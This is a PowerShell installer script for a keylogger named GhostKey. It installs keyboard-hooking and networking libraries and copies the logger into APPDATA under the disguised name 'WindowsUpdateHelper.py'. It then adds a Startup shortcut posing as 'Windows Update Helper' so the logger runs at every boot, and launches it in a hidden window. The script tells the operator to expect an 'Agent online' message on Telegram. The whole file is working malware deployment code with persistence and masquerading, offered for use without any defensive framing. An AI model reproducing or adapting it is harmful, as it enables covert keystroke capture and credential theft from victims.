# setup.ps1 — One-click GhostKey Installer
# Right-click → "Run with PowerShell" as Administrator

Write-Host "=== GhostKey Installer ===" -ForegroundColor Cyan
Write-Host ""

# Get current folder path
$scriptPath = Split-Path -Parent $MyInvocation.MyCommand.Path
$ghostkeyPath = Join-Path $scriptPath "ghostkey.py"

# Check if ghostkey.py exists
if (-not (Test-Path $ghostkeyPath)) {
    Write-Host "[ERROR] ghostkey.py not found in current folder!" -ForegroundColor Red
    Write-Host "Please place ghostkey.py next to this script." -ForegroundColor Yellow
    pause
    exit 1
}

Write-Host "[1/4] Installing dependencies..." -ForegroundColor Yellow
try {
    pip install pynput pywin32 requests 2>&1 | Out-Null
    Write-Host "  Done!" -ForegroundColor Green
} catch {
    Write-Host "  Failed: $_" -ForegroundColor Red
    pause
    exit 1
}

Write-Host "[2/4] Copying to APPDATA..." -ForegroundColor Yellow
$targetDir = "$env:APPDATA\Microsoft\Windows"
if (-not (Test-Path $targetDir)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}
$targetFile = "$targetDir\WindowsUpdateHelper.py"
Copy-Item $ghostkeyPath $targetFile -Force
Write-Host "  Done!" -ForegroundColor Green

Write-Host "[3/4] Creating startup entry..." -ForegroundColor Yellow
$ws = New-Object -ComObject WScript.Shell
$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateHelper.lnk"
$sc = $ws.CreateShortcut($shortcutPath)
$sc.TargetPath = "python.exe"
$sc.Arguments = '"' + $targetFile + '"'
$sc.WindowStyle = 7
$sc.Description = "Windows Update Helper"
$sc.Save()
Write-Host "  Done!" -ForegroundColor Green

Write-Host "[4/4] Starting keylogger..." -ForegroundColor Yellow
Start-Process -WindowStyle Hidden -FilePath "python.exe" -ArgumentList $targetFile
Write-Host "  Done!" -ForegroundColor Green

Write-Host ""
Write-Host "=== Installation Complete ===" -ForegroundColor Cyan
Write-Host "Keylogger is now running!" -ForegroundColor Green
Write-Host "Check Telegram for 'Agent online' message." -ForegroundColor Green
Write-Host ""
Write-Host "It will auto-start on every boot." -ForegroundColor Yellow
Write-Host ""

pause